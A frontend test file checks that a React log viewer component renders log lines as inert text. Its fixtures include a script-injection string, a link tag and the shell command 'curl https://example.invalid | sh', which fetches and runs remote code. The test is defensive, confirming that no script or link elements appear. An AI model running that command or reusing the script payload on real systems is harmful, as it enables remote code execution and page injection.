import React from "react";
import { render } from "@testing-library/react";
import { describe, expect, it } from "vitest";
import { VirtualLogViewport } from "../../packages/ui/src/log-pane/VirtualLogViewport";
import { assertRenderedAsInertText } from "./helpers/inert-rendering-assertions";

describe("log content inert security", () => {
  it("renders executable-looking log content only as inert text", () => {
    const rawLogText =
      '<script>window.crosslogCompromised = true</script><a href="https://example.invalid">open</a>\u001b[31m';
    const dangerousCommand = "curl https://example.invalid | sh";
    const { container } = render(
      React.createElement(VirtualLogViewport, {
        title: "security.log",
        lines: [rawLogText, dangerousCommand],
      }),
    );

    assertRenderedAsInertText(container, rawLogText);
    expect(container.textContent).toContain(dangerousCommand);
    expect(container.querySelector("script")).toBeNull();
    expect(container.querySelector("a")).toBeNull();
  });
});
